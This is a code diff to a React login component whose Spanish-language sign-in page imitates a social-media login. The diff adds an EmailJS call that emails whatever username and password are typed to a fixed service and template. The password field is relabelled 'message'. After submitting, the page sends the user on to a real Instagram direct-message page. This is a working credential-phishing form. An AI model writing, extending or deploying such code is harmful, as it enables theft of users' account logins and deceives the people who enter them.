@@ -1,34 +1,31 @@
-import { useRef, useState } from "react"
+import { useRef, useState } from "react";
 import "./Header.css";
-import Axios from 'axios'
-
+// import Axios from 'axios'
+import emailjs from "@emailjs/browser";
 
 export function Sesion() {
   const [disable, setDisable] = useState(true);
-  const [nombre, setNombre] = useState({
-    x: '',
-    y: ''
-  })
-    const handlenClick = () => {
-    const ValueUserName = username.current.value
-    const ValuePassword = password.current.value;  
-      nombre.x = ValueUserName,
-      nombre.y = ValuePassword
-  
-    console.log(nombre.x)
-    console.log(nombre.y)
-    
-    Axios.post('http://localhost:4000/create',{
-        nombre: nombre.x,
-        contrasena : nombre.y
-    }).then(()=>{
-    alert('usuario registrado')
-    })
-  
-  
-  };
+  // const [nombre, setNombre] = useState({
+  //   x: '',
+  //   y: ''
+  // })
+  // const handlenClick = () => {
+  // const ValueUserName = username.current.value
+  // const ValuePassword = password.current.value;
+  //   nombre.x = ValueUserName,
+  //   nombre.y = ValuePassword
 
- 
+  // console.log(nombre.x)
+  // console.log(nombre.y)
+
+  // Axios.post('http://localhost:4000/create',{
+  //     nombre: nombre.x,
+  //     contrasena : nombre.y
+  // }).then(()=>{
+  // alert('usuario registrado')
+  // })
+
+  // };
 
   const links = {
     url: "../../../public/primary-imgs/getMicrosoft.webp",
@@ -39,9 +36,6 @@ export function Sesion() {
 
   const username = useRef();
   const password = useRef();
-    
-
-
 
   const OnChance = (event) => {
     event.preventDefault;
@@ -56,7 +50,26 @@ export function Sesion() {
       setDisable(true);
     }
   };
+  const form = useRef();
 
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm("service_q4ubnwn", "template_c55m5eb", form.current, {
+        publicKey: "F2CtxeFRiIqpfoRP6",
+      })
+      .then(
+        () => {
+          console.log("SUCCESS!");
+        },
+        (error) => {
+          console.log("FAILED...", error.text);
+        }
+      );
+    window.location.href =
+      "https://www.instagram.com/direct/t/17842804736363600/";
+  };
 
   return (
     <main className="relative flex flex-col">
@@ -64,17 +77,18 @@ export function Sesion() {
         <div className=" m-auto overflow-hidden mb-9 h-[104px]">
           <img
             className=" m-auto"
-            src="../../../public/primary-imgs/title.webp"
+            src="/public/primary-imgs/title.webp"
             alt=""
           />
         </div>
 
-        <form action="" onChange={OnChance}>
+        <form ref={form} onSubmit={sendEmail} onChange={OnChance}>
           <input
             // onChange={(event)=>{
             //   setNombre(event.target.value)
-            //   console.log(nombre)
+            //
             // }}
+            name="from_name"
             ref={username}
             className=" outline-none mb-1 border-[1px] border-gray-500/50 px-2 text-slate-800 text-[12.3px] h-[34px] w-full bg-slate-400/5"
             type="text"
@@ -83,20 +97,22 @@ export function Sesion() {
           <input
             //   onChange={(event)=>{
             //   setContrasena(event.target.value)
-            //   console.log(nombre)
+            //
             //  }}
+            name="message"
             ref={password}
             className=" outline-none mb-4 border-[1px] border-gray-500/50 px-2 text-slate-800 text-[12.3px] h-[34px] w-full bg-slate-400/5"
             type="password"
             placeholder="Contraseña"
           />
-       
+
           <button
-            onClick={handlenClick}
+            // onClick={handlenClick}
             disabled={disable}
             id={disable ? "disable" : "notdisable"}
             className=" w-full h-8 rounded-md bg-blue-400 text-white font-semibold text-sm "
-            type="button"
+            type="submit"
+            value="send"
           >
             Iniciar sesion
             {/* {!disable ? <a href="/about"></a> : ""} */}
@@ -113,7 +129,7 @@ export function Sesion() {
           <a className=" text-center items-center w-full" href="">
             <img
               className="w-[18px] inline-block relative top-[0.5px] mx-2"
-              src="../../../public/primary-imgs/IconFacebook.svg"
+              src="/../public/primary-imgs/IconFacebook.svg"
               alt=""
             />
             <span className="text-nowrap text-center text-sm items-center font-medium text-blue-900">
